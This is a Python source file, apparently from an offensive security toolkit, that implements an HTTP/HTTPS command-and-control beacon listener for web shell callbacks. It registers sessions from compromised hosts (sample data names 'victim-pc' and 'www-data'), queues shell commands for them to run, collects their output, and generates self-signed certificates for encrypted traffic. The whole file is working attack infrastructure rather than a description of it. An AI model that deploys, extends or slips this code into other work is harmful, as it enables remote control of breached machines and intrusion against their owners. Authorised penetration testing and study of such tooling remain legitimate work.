"""
HTTP/HTTPS beacon listener for web shell callbacks.

Features:
- Flask-based HTTP server with HTTPS support
- Beacon polling (heartbeat tracking)
- Command queue (send commands to beacon)
- Response parsing
- Session auto-registration on first beacon
- Self-signed certificate generation for HTTPS
"""

import threading
import ssl
import os
import tempfile
import uuid
import logging
from datetime import datetime
from pathlib import Path
from typing import Dict, Any, List, Optional, Callable
from flask import Flask, request, jsonify

from ..interfaces import IListener
from ..models import Session, Listener
from ..events import EventBus, SessionEvent
from ..storage.listener_store import ListenerRegistry

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class HTTPListener(IListener):
    """HTTP/HTTPS beacon listener for web shell callbacks.

    This listener provides a lightweight C2-style beacon infrastructure for
    web shell callbacks. Beacons poll for commands and return output.

    Architecture:
    - Flask HTTP server running in background thread
    - Command queues per session (FIFO)
    - Response storage per session
    - Auto-registration on first beacon
    - Optional HTTPS with self-signed certs

    Endpoints:
    - POST /beacon: Beacon heartbeat + command responses
    - POST /register: New beacon registration
    - GET /health: Health check

    Example:
        >>> listener = HTTPListener(port=8080, session_manager=manager)
        >>> listener.start()
        >>> listener.send_command(session_id, "whoami")
        >>> response = listener.get_response(session_id)
    """

    def __init__(
        self,
        port: int,
        session_manager: Any,
        https: bool = False,
        host: str = '0.0.0.0',
        cert_path: Optional[Path] = None,
        key_path: Optional[Path] = None
    ):
        """Initialize HTTP beacon listener.

        Args:
            port: Port to listen on
            session_manager: SessionManager instance for session creation
            https: Enable HTTPS (generates self-signed cert if paths not provided)
            host: Host to bind to (default: 0.0.0.0)
            cert_path: Path to SSL certificate (optional, auto-generated if HTTPS enabled)
            key_path: Path to SSL private key (optional, auto-generated if HTTPS enabled)
        """
        self.port = port
        self.session_manager = session_manager
        self.https = https
        self.host = host
        self.cert_path = cert_path
        self.key_path = key_path

        # Internal state
        self.listener_id = str(uuid.uuid4())
        self.command_queues: Dict[str, List[str]] = {}  # session_id -> [commands]
        self.responses: Dict[str, List[Dict[str, Any]]] = {}  # session_id -> [responses]
        self.session_metadata: Dict[str, Dict[str, Any]] = {}  # session_id -> metadata

        # Flask app
        self.app = Flask(__name__)
        self.app.logger.setLevel(logging.WARNING)  # Suppress Flask logs
        self._setup_routes()

        # Server thread
        self.server_thread: Optional[threading.Thread] = None
        self._running = False

        # Listener model
        self.listener = Listener(
            id=self.listener_id,
            protocol='https' if https else 'http',
            port=port,
            status='stopped',
            config={
                'host': host,
                'https': https,
                'cert_path': str(cert_path) if cert_path else None,
                'key_path': str(key_path) if key_path else None
            }
        )

        # Registry
        self.registry = ListenerRegistry()

        # Connection callbacks
        self._connection_callbacks: List[Callable[[str], None]] = []

    def _setup_routes(self):
        """Setup Flask routes."""

        @self.app.route('/health', methods=['GET'])
        def health():
            """Health check endpoint."""
            return jsonify({
                'status': 'running',
                'listener_id': self.listener_id,
                'active_sessions': len(self.session_metadata),
                'protocol': 'https' if self.https else 'http',
                'port': self.port
            })

        @self.app.route('/beacon', methods=['POST'])
        def beacon():
            """Beacon heartbeat endpoint.

            Expected JSON:
                {
                    "session_id": "uuid",
                    "hostname": "victim-pc",
                    "username": "www-data",
                    "os": "Linux",
                    "shell_type": "bash",
                    "response": "output from last command"
                }

            Response JSON:
                {
                    "command": "whoami",  # Next command to run
                    "session_id": "uuid"
                }
            """
            try:
                data = request.get_json()

                if not data:
                    return jsonify({'error': 'No JSON data provided'}), 400

                session_id = data.get('session_id')

                if not session_id:
                    return jsonify({'error': 'session_id required'}), 400

                # Update session metadata
                self._update_session_metadata(session_id, data)

                # Store response if provided
                response_data = data.get('response')
                if response_data:
                    self._store_response(session_id, response_data)

                # Get next command from queue
                command = self._get_next_command(session_id)

                return jsonify({
                    'command': command,
                    'session_id': session_id
                })

            except Exception as e:
                logger.error(f"Error handling beacon: {e}")
                return jsonify({'error': str(e)}), 500

        @self.app.route('/register', methods=['POST'])
        def register():
            """Register new beacon session.

            Expected JSON:
                {
                    "hostname": "victim-pc",
                    "username": "www-data",
                    "os": "Linux",
                    "shell_type": "bash",
                    "target": "192.168.45.150"
                }

            Response JSON:
                {
                    "session_id": "uuid",
                    "listener_id": "uuid",
                    "beacon_url": "http://LHOST:8080/beacon"
                }
            """
            try:
                data = request.get_json()

                if not data:
                    return jsonify({'error': 'No JSON data provided'}), 400

                # Create new session
                session = self._create_beacon_session(data)

                # Initialize command queue and response storage
                self.command_queues[session.id] = []
                self.responses[session.id] = []
                self.session_metadata[session.id] = data

                # Notify listeners
                for callback in self._connection_callbacks:
                    try:
                        callback(session.id)
                    except Exception as e:
                        logger.error(f"Error in connection callback: {e}")

                # Emit event
                EventBus.publish(SessionEvent.SESSION_STARTED, {
                    'session_id': session.id,
                    'target': session.target,
                    'port': self.port,
                    'type': 'http',
                    'protocol': 'beacon',
                    'listener_id': self.listener_id
                })

                return jsonify({
                    'session_id': session.id,
                    'listener_id': self.listener_id,
                    'beacon_url': f"{'https' if self.https else 'http'}://{request.host}/beacon"
                })

            except Exception as e:
                logger.error(f"Error registering beacon: {e}")
                return jsonify({'error': str(e)}), 500

    def _create_beacon_session(self, data: Dict[str, Any]) -> Session:
        """Create session from beacon registration data.

        Args:
            data: Registration data from beacon

        Returns:
            Created Session instance
        """
        target = data.get('target', request.remote_addr)
        hostname = data.get('hostname', 'unknown')
        username = data.get('username', 'unknown')
        os_type = data.get('os', 'unknown')
        shell_type = data.get('shell_type', 'unknown')

        session = self.session_manager.create_session(
            type='http',
            target=target,
            port=self.port,
            protocol='beacon',
            shell_type=shell_type,
            metadata={
                'listener_id': self.listener_id,
                'hostname': hostname,
                'username': username,
                'os': os_type,
                'beacon_protocol': 'http',
                'registration_time': datetime.now().isoformat()
            }
        )

        # Update listener session tracking
        self.listener.add_session(session.id)
        self.registry.register_listener(self.listener)

        logger.info(f"Created beacon session {session.id} from {target} ({username}@{hostname})")

        return session

    def _update_session_metadata(self, session_id: str, data: Dict[str, Any]):
        """Update session metadata from beacon data.

        Args:
            session_id: Session identifier
            data: Beacon data
        """
        if session_id not in self.session_metadata:
            self.session_metadata[session_id] = {}

        self.session_metadata[session_id].update({
            'last_seen': datetime.now().isoformat(),
            'hostname': data.get('hostname'),
            'username': data.get('username'),
            'os': data.get('os'),
            'shell_type': data.get('shell_type')
        })

        # Update session in manager
        try:
            self.session_manager.update_session(session_id, {
                'last_seen': datetime.now()
            })
        except Exception as e:
            logger.warning(f"Failed to update session {session_id}: {e}")

    def _store_response(self, session_id: str, response: str):
        """Store command response from beacon.

        Args:
            session_id: Session identifier
            response: Command output
        """
        if session_id not in self.responses:
            self.responses[session_id] = []

        self.responses[session_id].append({
            'timestamp': datetime.now().isoformat(),
            'output': response
        })

        # Keep only last 100 responses per session
        if len(self.responses[session_id]) > 100:
            self.responses[session_id] = self.responses[session_id][-100:]

    def _get_next_command(self, session_id: str) -> Optional[str]:
        """Get next command from queue for session.

        Args:
            session_id: Session identifier

        Returns:
            Next command or None if queue empty
        """
        if session_id not in self.command_queues or not self.command_queues[session_id]:
            return None

        # Pop first command from queue (FIFO)
        return self.command_queues[session_id].pop(0)

    def _generate_self_signed_cert(self) -> tuple[Path, Path]:
        """Generate self-signed SSL certificate.

        Returns:
            Tuple of (cert_path, key_path)
        """
        from subprocess import run, PIPE

        # Create temp directory for certs
        cert_dir = Path.home() / ".crack" / "sessions" / "certs"
        cert_dir.mkdir(parents=True, exist_ok=True)

        cert_path = cert_dir / f"beacon_{self.port}.crt"
        key_path = cert_dir / f"beacon_{self.port}.key"

        # Generate cert if it doesn't exist
        if not cert_path.exists() or not key_path.exists():
            logger.info("Generating self-signed SSL certificate...")

            cmd = [
                'openssl', 'req', '-x509', '-newkey', 'rsa:4096',
                '-keyout', str(key_path),
                '-out', str(cert_path),
                '-days', '365',
                '-nodes',
                '-subj', '/CN=beacon.local'
            ]

            result = run(cmd, stdout=PIPE, stderr=PIPE)

            if result.returncode != 0:
                raise RuntimeError(f"Failed to generate SSL certificate: {result.stderr.decode()}")

            logger.info(f"SSL certificate generated: {cert_path}")

        return cert_path, key_path

    def start(self) -> bool:
        """Start the HTTP listener.

        Returns:
            True if started successfully

        Raises:
            RuntimeError: If listener fails to start
        """
        if self._running:
            logger.warning("Listener already running")
            return False

        # Check port availability
        if not self.registry.is_port_available(self.port):
            raise RuntimeError(f"Port {self.port} already in use")

        # Generate SSL cert if HTTPS enabled
        if self.https:
            if not self.cert_path or not self.key_path:
                self.cert_path, self.key_path = self._generate_self_signed_cert()

            if not self.cert_path.exists() or not self.key_path.exists():
                raise RuntimeError("SSL certificate files not found")

        # Start Flask in background thread
        self._running = True
        self.server_thread = threading.Thread(
            target=self._run_server,
            daemon=True
        )
        self.server_thread.start()

        # Update listener state
        self.listener.start()
        self.listener.pid = os.getpid()  # Use current process PID

        # Register with listener registry
        try:
            self.registry.register_listener(self.listener)
        except RuntimeError as e:
            self._running = False
            raise RuntimeError(f"Failed to register listener: {e}")

        # Emit event
        EventBus.publish(SessionEvent.LISTENER_STARTED, {
            'listener_id': self.listener_id,
            'port': self.port,
            'protocol': 'https' if self.https else 'http'
        })

        protocol = 'HTTPS' if self.https else 'HTTP'
        logger.info(f"{protocol} beacon listener started on {self.host}:{self.port}")
        logger.info(f"Beacon URL: {'https' if self.https else 'http'}://<LHOST>:{self.port}/beacon")

        return True

    def _run_server(self):
        """Run Flask server (called in background thread)."""
        try:
            if self.https:
                # Create SSL context
                context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                context.load_cert_chain(str(self.cert_path), str(self.key_path))

                self.app.run(
                    host=self.host,
                    port=self.port,
                    ssl_context=context,
                    threaded=True,
                    use_reloader=False
                )
            else:
                self.app.run(
                    host=self.host,
                    port=self.port,
                    threaded=True,
                    use_reloader=False
                )
        except Exception as e:
            logger.error(f"Listener crashed: {e}")
            self.listener.crash()
            EventBus.publish(SessionEvent.LISTENER_CRASHED, {
                'listener_id': self.listener_id,
                'error': str(e)
            })
            self._running = False

    def stop(self) -> bool:
        """Stop the HTTP listener.

        Returns:
            True if stopped successfully
        """
        if not self._running:
            return False

        self._running = False

        # Update listener state
        self.listener.stop()

        # Unregister from registry
        self.registry.unregister_listener(self.listener_id)

        # Emit event
        EventBus.publish(SessionEvent.LISTENER_STOPPED, {
            'listener_id': self.listener_id
        })

        logger.info(f"HTTP beacon listener stopped on port {self.port}")

        return True

    def restart(self) -> bool:
        """Restart the HTTP listener.

        Returns:
            True if restarted successfully
        """
        self.stop()
        return self.start()

    def status(self) -> str:
        """Get current listener status.

        Returns:
            Status string ('running', 'stopped', 'crashed')
        """
        return self.listener.status

    def on_connection(self, callback: Callable[[str], None]) -> None:
        """Register callback for new connections.

        Args:
            callback: Function to call with session_id when beacon connects
        """
        self._connection_callbacks.append(callback)

    def get_active_sessions(self) -> List[str]:
        """Get list of active session IDs.

        Returns:
            List of session UUID strings
        """
        return list(self.session_metadata.keys())

    def send_command(self, session_id: str, command: str):
        """Queue command for beacon.

        Args:
            session_id: Session identifier
            command: Command to execute

        Raises:
            ValueError: If session not found
        """
        if session_id not in self.command_queues:
            raise ValueError(f"Session {session_id} not found")

        self.command_queues[session_id].append(command)
        logger.info(f"Queued command for session {session_id}: {command}")

    def get_response(self, session_id: str, index: int = -1) -> Optional[Dict[str, Any]]:
        """Get command response from beacon.

        Args:
            session_id: Session identifier
            index: Response index (-1 for last, 0 for first, etc.)

        Returns:
            Response dictionary with 'timestamp' and 'output' keys, or None
        """
        if session_id not in self.responses or not self.responses[session_id]:
            return None

        try:
            return self.responses[session_id][index]
        except IndexError:
            return None

    def get_all_responses(self, session_id: str) -> List[Dict[str, Any]]:
        """Get all responses for session.

        Args:
            session_id: Session identifier

        Returns:
            List of response dictionaries
        """
        return self.responses.get(session_id, [])

    def clear_responses(self, session_id: str):
        """Clear response history for session.

        Args:
            session_id: Session identifier
        """
        if session_id in self.responses:
            self.responses[session_id] = []

    def get_session_info(self, session_id: str) -> Optional[Dict[str, Any]]:
        """Get session metadata.

        Args:
            session_id: Session identifier

        Returns:
            Session metadata dictionary or None
        """
        return self.session_metadata.get(session_id)
